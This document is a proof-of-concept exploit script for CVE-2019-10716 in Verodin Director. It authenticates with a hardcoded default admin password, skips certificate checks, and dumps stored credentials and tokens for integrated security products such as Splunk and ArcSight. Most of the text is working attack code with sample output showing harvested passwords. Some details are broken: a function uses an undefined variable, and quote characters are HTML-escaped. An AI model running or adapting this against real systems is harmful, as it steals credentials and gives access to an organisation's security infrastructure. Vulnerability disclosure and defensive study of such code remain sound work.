#  Discovery Date: 2019-01-31
#  Exploit Author: Nolan B. Kennedy (nxkennedy)
#  Vendor Homepage: https://www.verodin.com/
#  Software Link : https://www.verodin.com/demo-request/demo-request-form
#  Tested Versions: v3.5.1.0, v3.5.2.0, v3.5.3.1
#  Tested On: Windows
#  CVE: CVE-2019-10716
#  Vulnerability Type: Sensitive Data Disclosure
###
# Description: Verodin Director&#039;s REST API allows authenticated users to query the configuration
#       details, which include credentials, of any 50+ possible integrated security tools (e.g. Splunk, ArcSight, Palo Alto, AWS Cloud Trail).
#       Fortunately for attackers, members of 3 out of the 4 user groups in the Director can query this info (Users, Power Users, System Admin). 
#
#       API Request: GET https://<director-ip>/integrations.json
#
# Usage: python3 script.py
#
# Example Output:
#
#       -- VERODIN DIRECTOR WEB CONSOLE < V3.5.4.0 - REMOTE AUTHENTICATED PASSWORD DISCLOSURE (POC) --
#	-- Author: Nolan B. Kennedy (nxkennedy) --
#
#
#       [+] Director Version
#       =====================
#       [*] Detected version 3.5.1.0 is VULNERABLE! :)
#
#
#       [+] Account Permissions
#       ========================
#       [*] "admin@verodin.com" is a member of "System Admin"
#
#
#       [+] Verodin Integrations
#       =========================
#       [*] Product: splunk
#       [*] Username: splunk_svc_acct
#       [*] Misc (may include credentials): [{&#039;scheme&#039;: &#039;https&#039;, &#039;basic&#039;: False, &#039;password&#039;: &#039;Sup3rP@ssw0rd&#039;,
#       &#039;port&#039;: 8089, &#039;host&#039;: &#039;10.0.0.6&#039;, &#039;username&#039;: &#039;splunk_svc_acct&#039;},
#       {&#039;proxy_hash&#039;: None}]
#
#       [*] Product: arcsight
#       [*] Username: arcsight_admin
#       [*] Misc (may include credentials): [&#039;10.0.0.7&#039;, 8443, &#039;https&#039;, &#039;arcsight_admin&#039;, &#039;Sup3rP@ssw0rd&#039;,
#       "/All Filters/Personal/integration_user&#039;s filters/Verodin Filter", &#039;Verodin Query Viewer&#039;, 60]
#
#       [+] Done!
###

import base64
from distutils.version import LooseVersion
import json
import re
import ssl
from sys import exit
from time import sleep
import urllib.request




verodin_ip = &#039;0.0.0.0&#039;
# Default System Admin creds. Worth a try.
username = &#039;admin@verodin.com&#039;
password = &#039;Ver0d!nP@$$&#039;
base_url = &#039;https://{}&#039;.format(verodin_ip)
fixed_version = &#039;3.5.4.0&#039;


# We&#039;ll be making 3 different requests so we need a web handling function
def requests(target, html=False):

        url = base_url + target
        context = ssl._create_unverified_context() # so we don&#039;t get an ssl cert error
        req  = urllib.request.Request(url)
        credentials = (&#039;{}:{}&#039;.format(username, password))
        encoded_credentials = base64.b64encode(credentials.encode(&#039;ascii&#039;))
        req.add_header(&#039;Authorization&#039;, &#039;Basic %s&#039; % encoded_credentials.decode("ascii")) # use %s instead of format because errors
        r = urllib.request.urlopen(req, context=context)
        content = r.read().decode(&#039;utf-8&#039;)
        if r.getcode() == 200:
                # we don&#039;t always get a 401 if auth fails
                if &#039;Cookies need to be enabled&#039; in content: 
                        print(&#039;[!] Failed to retrieve data: Credentials incorrect/invalid&#039;)
                        print()
                        print(&#039;[!] Exiting...&#039;)
                        exit(1)
                elif html:
                        blob = content
                else:
                        blob = json.loads(content)
                return blob
        elif r.getcode() == 401:
                print(&#039;[!] Failed to retrieve data: Credentials incorrect/invalid&#039;)
                print()
                print(&#039;[!] Exiting...&#039;)
                exit(1)
        else:
                print(&#039;[!] ERROR: Status Code {}&#039;.format(r.getcode()))
                exit(1)
                

# Do we have permissions to retrieve the creds? 
def getUserPerms():

	r = requests(target) # returns a single json dict
	print(&#039;\n[+] Account Permissions&#039;)
	print(&#039;========================&#039;)
	group_id = r[&#039;user_group_id&#039;]
	roles = {&#039;Reporting&#039;: 4, &#039;Users&#039;: 3, &#039;Power Users&#039;: 2, &#039;System Admin&#039;: 1}
	for role,value in roles.items():
		if group_id == value:
			print(&#039;[*] "{}" is a member of "{}"&#039;.format(username, role))
			print()
			if group_id == 4:
				print(&#039;[!] This account does not have sufficient privs. You need "Users" or higher.&#039;)
				print()
				print(&#039;[!] Exiting...&#039;)
				exit(1)
	sleep(0.5)
	

# We need to verify the target Director is running a vulnerable version
def checkVuln():

	target = &#039;/settings/system&#039;
	r = requests(target, html=True)
	field = re.search(r&#039;Director\sVersion:.*&#039;, r)
	version = field.group().split(&#039;<&#039;)[0].split(" ")[2]
	print(&#039;\n[+] Director Version&#039;)
	print(&#039;=====================&#039;)
	if LooseVersion(version) < LooseVersion(fixed_version):
		print(&#039;[*] Detected version {} is VULNERABLE! :)&#039;.format(version))
		print()
	else:
		print(&#039;[!] Detected version {} is not vulnerable. Must be < {}&#039;.format(version, fixed_version))
		print()
		print(&#039;[!] Exiting...&#039;) 

	sleep(0.5)
	

# Where we parse out any creds or other useful info 
def getLoot():

        target = &#039;/integrations.json&#039;
        r = requests(target)  # a list of json dicts
        print(&#039;\n[+] Verodin Integrations&#039;)
        print(&#039;=========================&#039;)
        if not r:
                print(&#039;[+] Dang! No integrations configured in this Director :(&#039;)
                print()
        else:
                for integration in r:
                        product = integration[&#039;package_name&#039;] # constant key
                        misc = integration.get(&#039;new_client_args&#039;) # we use .get to return a None type if the key doesn&#039;t exist
                        user = integration.get(&#039;username&#039;)
                        passw = integration.get(&#039;password&#039;)
                        token = integration.get(&#039;auth_token&#039;)
                        print(&#039;[*] Product: {}&#039;.format(product))
                        if user:
                                print(&#039;[*] Username: {}&#039;.format(user))
                        if passw:
                                print(&#039;[*] Password: {}&#039;.format(passw))
                        if token and token is not &#039;null&#039;:
                                print(&#039;[*] Auth Token: {}&#039;.format(token))
                        if misc:
                                print(&#039;[*] Misc (may include credentials): {}&#039;.format(misc))
                        print()
        sleep(0.5)


def main():

	print(&#039;\n-- Verodin Director Web Console < v3.5.4.0 - Remote Authenticated Password Disclosure (PoC) --&#039;.upper())
	print(&#039;-- Author: Nolan B. Kennedy (nxkennedy) --&#039;)
	print()
	checkVuln()
	getUserPerms()
	getLoot()
	print(&#039;[+] Done!&#039;)
			
		
if __name__ == &#039;__main__&#039;:
	main()

